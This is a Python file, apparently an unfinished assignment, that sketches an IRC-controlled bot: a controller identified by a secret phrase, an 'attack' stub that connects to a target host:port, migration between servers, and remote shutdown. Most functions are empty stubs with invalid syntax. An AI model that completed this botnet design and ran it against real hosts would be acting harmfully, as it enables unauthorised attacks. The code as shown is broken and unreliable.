#bot.py
import sys
import random

# Function to get a nick with a high probability of being unique by using randomness
def getNick:
    rootOfName = "minion"


def connectToIRC:
    try:
        IRCconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)           # Create socket for TCP connection to IRC channet
        IRCconnection.connect((HOSTNAME,PORT))
    except Exception as e:
        print("Error: " + str(e))

def sendMessage:

def joinChannel:

def leaveChannel:

def authenticateController:

# Function that sends the nick of the bot to the controller
def sendStatus:

# Function that attacks hostName:hostPort by attempting to connect to hostName:hostPort
# and sending a string containing the attack count and nick of the bot. Sends status message
# to controler after attack is attempted
def attack(hostName, hostPort):

# Function to move bot from current IRC server to IRC server on hostName:hostPort #channel
# Will send status of migration attempt to controller on current IRC before disconnecting
def migrate(hostName, hostPort, channel):

# Function to shutdown the bot when instructed by controller.
def shutdownBot:

def main():
    global HOSTNAME
    global PORT
    global CHANNEL
    global SECRET_PHRASE                                                        # Secret code word that IRC bot will listen for to ID controller
    global nick
    global attackCount                                                          # Counter for number of attacks executed by current instance of bot
    global controllerNick
    global IRCconnection

    if len(sys.argv) == 5:
        HOSTNAME = str(sys.argv[1])
        PORT = int(sys.argv[2])
        CHANNEL = str(sys.argv[3])
        SECRET_PHRASE = str(sys.argv[4])
        attackCount = 0

    else:
        print("Error: wrong command line arguments", file = sys.stderr)

if __name__ == "__main__":
    main()
